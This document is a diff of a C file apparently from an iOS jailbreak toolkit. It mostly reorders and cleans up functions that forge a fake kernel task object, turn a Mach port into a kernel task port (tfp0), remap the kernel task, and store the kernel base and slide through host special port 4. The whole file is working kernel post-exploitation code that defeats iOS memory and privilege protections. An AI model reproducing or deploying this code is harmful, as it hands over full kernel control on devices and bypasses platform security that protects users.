@@ -1,17 +1,13 @@
 //not elec tho
 
 #include "remap_tfp_set_hsp.h"
-
-#include <stdlib.h>
+#include "KernelMemory.h"
 #include "OffsetHolder.h"
 #include "KernelUtils.h"
-#include "find_port.h"
-#include "patchfinder64.h"
-#include "KernelMemory.h"
-#include "common.h"
 #include "VarHolder.h"
-#include "PFOffs.h"
 #include "kernel_slide.h"
+#include "PFOffs.h"
+#include <stdlib.h>
 #include <dlfcn.h>
 #include <mach-o/loader.h>
 #include <mach/host_priv.h>
@@ -30,10 +26,25 @@ int F_OFFS = false;
 
 
 
+
+uint64_t make_fake_task(uint64_t vm_map) {
+    uint64_t fake_task_kaddr = kmem_alloc(0x1000);
+    
+    void* fake_task = malloc(0x1000);
+    memset(fake_task, 0, 0x1000);
+    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references
+    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;
+    *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;
+    *(uint8_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
+    kmemcpy(fake_task_kaddr, (uint64_t) fake_task, 0x1000);
+    free(fake_task);
+    
+    return fake_task_kaddr;
+}
+
 uint64_t get_proc_struct_for_pid(pid_t pid)
 {
     uint64_t proc = ReadKernel64(ReadKernel64(GETOFFSET(kernel_task)) + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
-    LOGME("kernproc = " ADDR, proc);
     while (proc) {
         if (ReadKernel32(proc + koffset(KSTRUCT_OFFSET_PROC_PID)) == pid)
             return proc;
@@ -42,7 +53,8 @@ uint64_t get_proc_struct_for_pid(pid_t pid)
     return 0;
 }
 
-
+uint32_t IO_BITS_ACTIVE = 0x80000000;
+uint32_t IKOT_TASK = 2;
 uint64_t get_address_of_port(pid_t pid, mach_port_t port)
 {
     uint64_t proc_struct_addr = get_proc_struct_for_pid(pid);
@@ -54,34 +66,6 @@ uint64_t get_address_of_port(pid_t pid, mach_port_t port)
     uint64_t port_addr = ReadKernel64(is_table + (port_index * sizeof_ipc_entry_t));
     return port_addr;
 }
-
-
-bool found_offs = false;
-
-uint64_t cached_task_self_addr_ = 0;
-uint64_t task_self_addr()
-{
-    
-    if (F_OFFS == 0)
-    {
-        found_offs = false;
-    } else
-    {
-        found_offs = true;
-    }
-    
-    
-    if (cached_task_self_addr_ == 0) {
-        cached_task_self_addr_ = have_kmem_read() && found_offs ? get_address_of_port(getpid(), mach_task_self()) : find_port_address(mach_task_self(), MACH_MSG_TYPE_COPY_SEND);
-        LOGME("task self: 0x%llx", cached_task_self_addr_);
-    }
-    return cached_task_self_addr_;
-}
-
-
-uint32_t IO_BITS_ACTIVE = 0x80000000;
-uint32_t IKOT_TASK = 2;
-uint32_t IKOT_NONE = 0;
 
 void convert_port_to_task_port(mach_port_t port, uint64_t space, uint64_t task_kaddr) {
     // now make the changes to the port object to make it a task port:
@@ -116,34 +100,16 @@ void make_port_fake_task_port(mach_port_t port, uint64_t task_kaddr) {
     convert_port_to_task_port(port, ipc_space_kernel(), task_kaddr);
 }
 
-
-
-uint64_t make_fake_task(uint64_t vm_map) {
-    uint64_t fake_task_kaddr = kmem_alloc(0x1000);
-    
-    void* fake_task = malloc(0x1000);
-    memset(fake_task, 0, 0x1000);
-    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references
-    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;
-    *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;
-    *(uint8_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
-    kmemcpy(fake_task_kaddr, (uint64_t) fake_task, 0x1000);
-    free(fake_task);
-    
-    return fake_task_kaddr;
-}
-
-
 void set_all_image_info_addr(uint64_t kernel_task_kaddr, uint64_t all_image_info_addr) {
     struct task_dyld_info dyld_info = { 0 };
     mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
-    _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, "ERROR SET_ALL_IMAGE", true);
+    _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, message, true);
     LOGME("Will set all_image_info_addr to: " ADDR, all_image_info_addr);
     if (dyld_info.all_image_info_addr != all_image_info_addr) {
         LOGME("Setting all_image_info_addr...");
         WriteKernel64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_ALL_IMAGE_INFO_ADDR), all_image_info_addr);
-        _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, "ERROR SET_ALL_IMAGE", true);
-        _assert(dyld_info.all_image_info_addr == all_image_info_addr, "ERROR SET_ALL_IMAGE", true);
+        _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, message, true);
+        _assert(dyld_info.all_image_info_addr == all_image_info_addr, message, true);
     } else {
         LOGME("All_image_info_addr already set.");
     }
@@ -152,18 +118,17 @@ void set_all_image_info_addr(uint64_t kernel_task_kaddr, uint64_t all_image_info
 void set_all_image_info_size(uint64_t kernel_task_kaddr, uint64_t all_image_info_size) {
     struct task_dyld_info dyld_info = { 0 };
     mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
-    _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, "ERROR SET_ALL_IMAGE_INFO", true);
+    _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, message, true);
     LOGME("Will set all_image_info_size to: " ADDR, all_image_info_size);
     if (dyld_info.all_image_info_size != all_image_info_size) {
         LOGME("Setting all_image_info_size...");
         WriteKernel64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_ALL_IMAGE_INFO_SIZE), all_image_info_size);
-        _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, "ERROR SET_ALL_IMAGE_INFO", true);
-        _assert(dyld_info.all_image_info_size == all_image_info_size, "ERROR SET_ALL_IMAGE_INFO", true);
+        _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, message, true);
+        _assert(dyld_info.all_image_info_size == all_image_info_size, message, true);
     } else {
         LOGME("All_image_info_size already set.");
     }
 }
-
 
 
 kern_return_t mach_vm_remap(vm_map_t dst, mach_vm_address_t *dst_addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src, mach_vm_address_t src_addr, boolean_t copy, vm_prot_t *cur_prot, vm_prot_t *max_prot, vm_inherit_t inherit);
@@ -230,9 +195,7 @@ void remap_tfp0_set_hsp4(mach_port_t *port) {
     _assert(mach_vm_wire(mach_host_self(), km_fake_task_port, remapped_task_addr, sizeof_task, VM_PROT_READ | VM_PROT_WRITE) == KERN_SUCCESS, message, true);
     uint64_t port_kaddr = get_address_of_port(getpid(), *port);
     LOGME("port_kaddr = " ADDR, port_kaddr);
-    LOGME("Fail around fucking 6");
     make_port_fake_task_port(*port, remapped_task_addr);
-    LOGME("Fail around fucking 7");
     _assert(ReadKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) == remapped_task_addr, message, true);
     // lck_mtx -- arm: 8  arm64: 16
     uint64_t host_priv_kaddr = get_address_of_port(getpid(), mach_host_self());
@@ -241,3 +204,6 @@ void remap_tfp0_set_hsp4(mach_port_t *port) {
     set_all_image_info_addr(kernel_task_kaddr, kbase);
     set_all_image_info_size(kernel_task_kaddr, kernel_slide);
 }
+
+
+
